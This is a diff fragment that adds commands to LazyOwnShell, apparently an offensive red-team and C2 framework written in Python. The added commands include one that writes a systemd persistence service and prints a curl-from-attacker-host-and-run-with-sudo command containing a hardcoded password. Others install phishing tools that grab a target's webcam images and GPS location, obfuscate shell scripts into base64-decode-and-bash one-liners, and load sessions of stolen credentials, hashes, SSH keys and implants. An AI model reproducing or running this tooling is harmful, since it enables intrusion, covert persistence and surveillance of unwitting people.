+        User=nobody
+
+        [Install]
+        WantedBy=multi-user.target
+        EOL
+        sudo cp {binary_name}.service /etc/systemd/system/{binary_name}.service && 
+        sudo systemctl daemon-reload && 
+        sudo systemctl start {binary_name} && 
+        sudo systemctl enable {binary_name}
+        """.replace('        ','')
+
+        service_file_path = os.path.join(self.sessions_dir, f"{binary_name}_service.sh")
+
+        try:
+            with open(service_file_path, "w") as service_file:
+                service_file.write(service_content)
+            print_msg(f"Service file created at {service_file_path}")
+        except Exception as e:
+            print_error(f"Failed to create service file: {e}")
+            return
+
+        password = 'grisgrisgris'    
+        cmd = f"curl http://{lhost}/{binary_name}_service.sh -o {binary_name}_service.sh && sudo -S chmod +x {binary_name}_service.sh && echo '{password}' | sudo -S bash {binary_name}_service.sh"
+        print_msg(f"Run the following command to enable and start the service: {cmd}")
+    
+
     def do_toctoc(self, line):
         """
         Sends a magic packet to the Chinese malware.
@@ -23253,6 +23627,300 @@ class LazyOwnShell(cmd2.Cmd):
         self.download_file_from_c2(line)
         return
     
+    def do_groq(self, line):
+        """
+        Execute a command to interact with the GROQ API using the provided API key.
+
+        This function takes an optional input line that is used as the prompt. If no input line is
+        provided, the default prompt stored in the instance is used. The function sets the GROQ_API_KEY
+        environment variable and runs a Python script to interact with the GROQ API.
+
+        Parameters:
+            line (str): The input line to be used as the prompt. If not provided, the default prompt is used.
+
+        Returns:
+            None
+        """
+        api_key = self.params["api_key"]
+        if not line:
+            prompt = self.prompt
+        else:
+            prompt = line.strip()
+        print_msg(f"Executing... python3 {self.path}/modules/lazygptcli2.py --prompt '{prompt}'")
+        os.system(f"export GROQ_API_KEY=\"{api_key}\" && python3 {self.path}/modules/lazygptcli2.py --prompt '{prompt}'")
+        return 
+    
+    def do_c2asm(self, arg):
+        """
+        Display C and ASM code side by side in a curses-based interface.
+
+        This function sets up a curses window to display C code and its corresponding
+        assembly code side by side. It allows the user to select a .c file from the
+        'sessions' directory and then displays the code with scrolling capabilities
+        both vertically and horizontally. A green vertical line separates the C code
+        from the ASM code.
+
+        Parameters:
+            stdscr (curses.window): The curses window object to draw on.
+
+        Returns:
+            None
+        """
+        curses.wrapper(self.view_code)
+        
+    def view_code(self, stdscr):
+        """
+        Display C and ASM code side by side in a curses-based interface.
+
+        This function sets up a curses window to display C code and its corresponding
+        assembly code side by side. It allows the user to select a .c file from the
+        'sessions' directory and then displays the code with scrolling capabilities
+        both vertically and horizontally. A green vertical line separates the C code
+        from the ASM code.
+
+        Parameters:
+            stdscr (curses.window): The curses window object to draw on.
+
+        Returns:
+            None
+        """
+        curses.curs_set(0)
+        stdscr.refresh()
+        stdscr.clear()
+        stdscr.nodelay(1)
+        stdscr.timeout(100)
+
+
+        path = os.path.join(os.getcwd(), 'sessions')
+        c_files = [f for f in os.listdir(path) if f.endswith('.c')]
+
+        if not c_files:
+            stdscr.addstr(0, 0, "No .c files found in 'sessions/' directory.")
+            stdscr.refresh()
+            stdscr.getch()
+            return
+
+        stdscr.addstr(0, 0, "Available .c files:")
+        for i, file in enumerate(c_files):
+            stdscr.addstr(i + 1, 0, f"    {i + 1}. {file}")
+        stdscr.refresh()
+
+
+        selected_file = None
+        while not selected_file:
+            stdscr.addstr(len(c_files) + 2, 0, "Choose a file by number (1-{}): ".format(len(c_files)))
+            stdscr.refresh()
+            key = stdscr.getch()
+            if key == 27:
+                return
+            try:
+                choice = int(chr(key))
+                if 1 <= choice <= len(c_files):
+                    selected_file = c_files[choice - 1]
+            except ValueError:
+                stdscr.addstr(len(c_files) + 3, 0, "Invalid input. Please enter a number.")
+                stdscr.refresh()
+                stdscr.getch()
+
+        code_c = os.path.join(path, selected_file)
+        code_asm = code_c.replace(".c", ".asm")
+        os.system(f"gcc -S -o {code_asm} {code_c}")
+
+        with open(code_c, 'r') as f:
+            c_code = f.readlines()
+        with open(code_asm, 'r') as f:
+            asm_code = f.readlines()
+
+
+        selected_line = 0
+        max_lines = max(len(c_code), len(asm_code))
+        top_line = 0
+
+        while True:
+            stdscr.clear()
+
+    
+            for i in range(top_line, top_line + stdscr.getmaxyx()[0]):
+                if i < len(c_code):
+                    line = c_code[i].rstrip()
+                    try:
+                        if i == selected_line:
+                            stdscr.addstr(i - top_line, 0, line[:stdscr.getmaxyx()[1] - 1], curses.A_REVERSE)
+                        else:
+                            stdscr.addstr(i - top_line, 0, line[:stdscr.getmaxyx()[1] - 1])
+                    except curses.error:
+                        pass
+
+    
+            for i in range(top_line, top_line + stdscr.getmaxyx()[0]):
+                if i < len(asm_code):
+                    line = asm_code[i].rstrip()
+                    try:
+                        if i == selected_line:
+                            stdscr.addstr(i - top_line, 40, line[:stdscr.getmaxyx()[1] - 41], curses.A_REVERSE)
+                        else:
+                            stdscr.addstr(i - top_line, 40, line[:stdscr.getmaxyx()[1] - 41])
+                    except curses.error:
+                        pass
+
+            stdscr.refresh()
+
+    
+            key = stdscr.getch()
+            if key == curses.KEY_UP and selected_line > 0:
+                selected_line -= 1
+                if selected_line < top_line:
+                    top_line -= 1
+            elif key == curses.KEY_DOWN and selected_line < max_lines - 1:
+                selected_line += 1
+                if selected_line >= top_line + stdscr.getmaxyx()[0]:
+                    top_line += 1
+            elif key == 27:
+                break
+
+    def do_camphish(self, line):
+        """
+        Executes the camphish tool for Grab cam shots from target's phone front camera or PC webcam just sending a link.
+
+        This function:
+            - Installs camphish if not already installed.
+            - Executes the camphish command with the provided parameters.
+            - Displays the result in the terminal.
+
+        Behavior:
+            - Requires `git` and `php` to be installed.
+            - Uses a one-liner installation method for simplicity.
+
+        Usage:
+            camphish
+        """
+        path = os.getcwd()
+        camphish_repo = "https://github.com/techchipnet/CamPhish.git"
+        camphish_path = os.path.join(path, "external", ".exploit", "CamPhish")
+
+        try:
+            if not os.path.exists(camphish_path):
+                print_msg("CamPhish is not installed. Installing...")
+                self.cmd(f"git clone {camphish_repo} {camphish_path}")
+                self.cmd(f"cd {camphish_path} && chmod +x camphish.sh")
+
+            command = f"cd {camphish_path} && ./camphish.sh"
+            self.cmd(command)
+
+        except Exception as e:
+            print_error(f"An error occurred: {e}")
+
+    def do_hound(self, line):
+        """
+        Executes the hound tool for Hound is a simple and light tool for information gathering and capture exact GPS coordinates
+
+        This function:
+            - Installs hound if not already installed.
+            - Executes the hound command with the provided parameters.
+            - Displays the result in the terminal.
+
+        Behavior:
+            - Requires `git` and `php` to be installed.
+            - Uses a one-liner installation method for simplicity.
+
+        Usage:
+            hound
+        """
+        path = os.getcwd()
+        hound_repo = "https://github.com/techchipnet/hound.git"
+        hound_path = os.path.join(path, "external", ".exploit", "hound")
+
+        try:
+            if not os.path.exists(hound_path):
+                print_msg("hound is not installed. Installing...")
+                self.cmd(f"git clone {hound_repo} {hound_path}")
+                self.cmd(f"cd {hound_path} && chmod +x hound.sh")
+
+            command = f"cd {hound_path} && ./hound.sh"
+            self.cmd(command)
+
+        except Exception as e:
+            print_error(f"An error occurred: {e}")
+
+    def do_ofuscatesh(self, line):
+        """
+        Obfuscates a shell script by encoding it in Base64 and prepares a command to decode and execute it.
+
+        This function reads the content of a shell script file, encodes it in Base64, and constructs a command
+        that can be used to decode and execute the encoded script using `echo` and `base64 -d`.
+
+        Args:
+            line (str): The path to the shell script file to be obfuscated. If not provided, a default
+                        path is obtained from the `get_users_dic` function.
+
+        Returns:
+            None
+
+        Example:
+            >>> ofuscatesh /path/to/script.sh or just ofuscatesh
+            # This will read the script, encode it in Base64, and prepare a command to decode and execute it.
+        """        
+        if not line:
+            line = get_users_dic('sh')
+
+        with open(line, 'r') as f:
+            content = f.read().strip()
+
+        utf8_encoded = content.encode("utf-8")
+        base64_encoded = base64.b64encode(utf8_encoded).decode('utf-8')
+        cmd = f"echo '{base64_encoded}' | base64 -d | bash"
+        copy2clip(cmd)
+
+    def do_load_session(self, line):
+        """
+        Load the session from the sessionLazyOwn.json file and display the status of various parameters.
+
+        This command reads the sessionLazyOwn.json file from the sessions directory and displays the status
+        of parameters, credentials, hashes, notes, plan, id_rsa, implants, and redop.
+
+        :param line: Additional arguments (not used in this command)
+        """
+        session_file_path = os.path.join('sessions', 'sessionLazyOwn.json')
+
+        try:
+            with open(session_file_path, 'r') as file:
+                session_data = json.load(file)
+
+            params_count = len(session_data.get('params', {}))
+            credentials_count = len(session_data.get('credentials', []))
+            hashes_count = len(session_data.get('hashes', []))
+            notes_status = 'LOADED' if 'notes' in session_data else 'NOT LOADED'
+            plan_status = 'LOADED' if 'plan' in session_data else 'NOT LOADED'
+            id_rsa_count = len(session_data.get('id_rsa', []))
+            implants_count = len(session_data.get('implants', []))
+            redop_status = 'LOADED' if 'redop' in session_data else 'NOT LOADED'
+
+            timestamp = session_data.get('timestamp', '')
+
+            if timestamp:
+                dt_object = datetime.strptime(timestamp, '%Y%m%d%H%M%S')
+                formatted_date_time = dt_object.strftime('%Y-%m-%d %H:%M:%S')
+            else:
+                formatted_date_time = 'N/A'
+            
+            print_msg(f"N° Params {params_count} [LOADED][OK]")
+            print_msg(f"N° Credentials {credentials_count} [LOADED][OK]")
+            print_msg(f"N° Hashes {hashes_count} [LOADED][OK]")
+            print_msg(f"N° Id_rsa {id_rsa_count} [LOADED][OK]")
+            print_msg(f"N° Implants {implants_count} [LOADED][OK]")
+            print_msg(f"Notes [{notes_status}][OK]")
+            print_msg(f"Plan [{plan_status}][OK]")
+            print_msg(f"RedTeam operation [{redop_status}][OK]")
+            print_msg(f"Start Operation: {formatted_date_time}")
+
+
+        except FileNotFoundError:
+            print_error(f"Error: The file {session_file_path} does not exist.")
+        except json.JSONDecodeError:
+            print_error(f"Error: The file {session_file_path} is not a valid JSON file.")
+        except Exception as e:
+            print_error(f"An unexpected error occurred: {e}")
+
     def do_lateral_mov_lin(self, line):
         """
         Perform lateral movement by downloading and installing LazyOwn on a remote Linux machine.
